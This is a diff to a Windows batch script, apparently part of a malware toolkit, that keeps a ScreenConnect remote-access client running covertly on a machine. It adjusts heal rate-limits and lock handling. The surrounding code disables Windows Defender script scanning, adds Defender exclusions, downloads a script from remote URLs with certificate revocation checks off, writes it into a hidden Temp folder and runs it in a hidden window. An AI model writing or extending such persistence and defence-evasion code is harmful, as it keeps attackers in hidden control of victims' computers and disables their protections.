@@ -1,6 +1,7 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260804M64
+rem  OWN_MON  BUILD 20260804M65
+rem  M65: never bypass HEAL rate-limit on 1060; keep gryxa_msi.lock (no delete before queue) — stops panel dupes.
 rem  M64: PUSH-RECONNECT under OBSERVE — bounce Gryxa / HEAL 1060; never clear watcher; no REINSTALL.
 rem  M63: OBSERVE still blocks REINSTALL;/x — allows HEAL start + 1060 /i (G10).
 rem  M62: QueueGryxaHeal hard-blocked under OBSERVE; pair with G10 (no shared ProductCode /x).
@@ -1001,23 +1002,28 @@ exit /b 0
 
 :QueueGryxaHeal
 rem %1=REINSTALL|HEAL — OBSERVE blocks REINSTALL only; HEAL (start/1060-i) allowed
+rem M65: ALWAYS rate-limit (20m if 1060, 90m if svc exists). Never delete gryxa_msi.lock here.
 set "HEALMODE=%~1"
 if "%HEALMODE%"=="" set "HEALMODE=HEAL"
 if exist "%WD%\observe.flag" if /I "!HEALMODE!"=="REINSTALL" (
   echo gryxa_reinstall_blocked_OBSERVE>>"%LOG%"
   exit /b 0
 )
-set "BYPASS_RL=0"
-sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
-if errorlevel 1 set "BYPASS_RL=1"
-if "!BYPASS_RL!"=="0" (
-  powershell -NoProfile -NonInteractive -Command "if((Test-Path '%WD%\gryxa_heal.flag') -and (((Get-Date)-(Get-Item '%WD%\gryxa_heal.flag').LastWriteTime).TotalMinutes -lt 90)){exit 1}else{exit 0}" >nul 2>&1
-  if errorlevel 1 (
-    echo gryxa_heal_rate_limited>>"%LOG%"
+rem in-flight lock: another heal/install already running
+if exist "%WD%\gryxa_msi.lock" (
+  powershell -NoProfile -NonInteractive -Command "if((Test-Path '%WD%\gryxa_msi.lock') -and (((Get-Date)-(Get-Item -LiteralPath '%WD%\gryxa_msi.lock').LastWriteTime).TotalMinutes -lt 25)){exit 0}else{exit 1}" >nul 2>&1
+  if not errorlevel 1 (
+    echo gryxa_heal_skip_lock_inflight>>"%LOG%"
     exit /b 0
   )
-) else (
-  echo gryxa_heal_bypass_rate_limit_1060>>"%LOG%"
+)
+set "RL_MIN=90"
+sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+if errorlevel 1 set "RL_MIN=20"
+powershell -NoProfile -NonInteractive -Command "if((Test-Path '%WD%\gryxa_heal.flag') -and (((Get-Date)-(Get-Item '%WD%\gryxa_heal.flag').LastWriteTime).TotalMinutes -lt %RL_MIN%)){exit 1}else{exit 0}" >nul 2>&1
+if errorlevel 1 (
+  echo gryxa_heal_rate_limited mins=%RL_MIN%>>"%LOG%"
+  exit /b 0
 )
 echo %DATE% %TIME% %HEALMODE%>"%WD%\gryxa_heal.flag"
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f >nul 2>&1
@@ -1026,7 +1032,6 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msie
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa.cmd" "%OWNGRYXA%" >nul 2>&1
 if not exist "%WD%\own_gryxa.cmd" "%CURL%" -L --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa.cmd" "%OWNGRYXA2%" >nul 2>&1
-if exist "%WD%\gryxa_msi.lock" del /f /q "%WD%\gryxa_msi.lock" >nul 2>&1
 if not exist "%SystemRoot%\Temp\.upd" mkdir "%SystemRoot%\Temp\.upd" >nul 2>&1
 > "%SystemRoot%\Temp\.upd\gryxa_heal_once.cmd" (
   echo @echo off
@@ -1036,7 +1041,7 @@ wmic process call create "cmd.exe /c %SystemRoot%\Temp\.upd\gryxa_heal_once.cmd"
 if errorlevel 1 (
   powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "Start-Process cmd.exe -ArgumentList '/c','%SystemRoot%\Temp\.upd\gryxa_heal_once.cmd' -WindowStyle Hidden" >nul 2>&1
 )
-echo gryxa_heal_queued mode=%HEALMODE%>>"%LOG%"
+echo gryxa_heal_queued mode=%HEALMODE% rl=%RL_MIN%>>"%LOG%"
 exit /b 0
 
 :EnsureGryxaWatch
